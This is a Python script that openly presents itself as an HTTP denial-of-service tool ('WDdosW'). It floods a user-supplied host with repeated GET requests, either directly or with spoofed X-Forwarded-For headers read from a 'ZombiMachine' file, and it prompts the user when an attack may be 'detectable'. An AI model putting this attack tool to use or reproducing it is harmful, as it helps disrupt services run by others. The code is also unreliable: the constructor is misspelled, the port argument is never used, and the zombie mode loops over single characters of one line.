import time
import requests
import argparse
import os


class Tool:

    def __int__(self):
        print("""
 --[[
______ _____ ___ _____ _   _   ___________  ______ _____ _   _ _____ 
|  _  |  ___/ _ |_   _| | | | |  _  |  ___| | ___ |_   _| \ | |  __ \
| | | | |__/ /_\ \| | | |_| | | | | | |_    | |_/ / | | |  \| | |  \/
| | | |  __|  _  || | |  _  | | | | |  _|   |  __/  | | | . ` | | __ 
| |/ /| |__| | | || | | | | | \ \_/ | |     | |    _| |_| |\  | |_\ \
|___/ \____\_| |_/\_/ \_| |_/  \___/\_|     \_|    \___/\_| \_/\____/
                                                                     
                                                                     
--]]
        """)

    time.sleep(3)

    def add_argument(self):

        parser = argparse.ArgumentParser(prog="WDdosW",description="for Ddos attack")

        parser.add_argument('-hs','--host',type=str,help="Specify host to attack => TYpe => https://www.example.com/ ")
        parser.add_argument("-c",'--count',type=int,help="Enter how many requests to send")
        parser.add_argument("-p",'--port',type=int,help="Type the port you want to attack => Recommended Port => 80 ")
        args = parser.parse_args()

        if args.host != None and  args.count != None and args.port != None:

            return args

        else:
            print("You must enter the host,count and port..!")
            exit()


    def get_read_file(self,host,count,port):

        try:
            url = host
            numberofrequest = count
            request_port = port

            with open ("ZombiMachine.txt","r") as file:
                file_read = file.readline().strip()

            for fl in file_read:

                for attk in range(numberofrequest):
                    print("Attack Started..%%")
                    print("Sending packet...{0}\n".format(requests.get(url, headers={"X-Forwarded-For-Ip": fl})))

                    time.sleep(1)

        except KeyboardInterrupt:
            print("*"*30)
            print("\nAttack Stopped..")

        return




    def attackHTTP(self,host,count,port):

        try:
            url = host
            numberofrequest = count
            request_port = port

            if numberofrequest > 350:
                respon = input("Attack detectable/ do you want to continue (Y/N) ")

                if respon.upper() == 'Y':

                    for attk in range(numberofrequest):
                        print("Attack Started..%%")
                        print("Sending packet ... {0}\n".format(requests.get(url)))

                        time.sleep(1)

                elif respon.upper() == "N":
                    return


            for attk in range(numberofrequest):

                print("Attack Started..%%")
                print("Sending packet ... {0}\n".format(requests.get(url)))

                time.sleep(1)

            return

        except KeyboardInterrupt:
            print(str("*")*30)
            print("\nAttack Stopped")



if __name__ == "__main__":

    tool = Tool()
    tool.__int__()

    args = tool.add_argument()

    print("""
    [1].ZombiMachine Ddos
    [2].Self Ddos 
    [3].Exit
    """)
    time.sleep(1)

    print("Exam => 1")
    choice = int(input("Choose =>"))


    if choice == 1:
        tool.get_read_file(args.host, args.count, args.port)


    if choice == 2:
        tool.attackHTTP(args.host,args.count,args.port)


    if choice == 3:
        exit()






















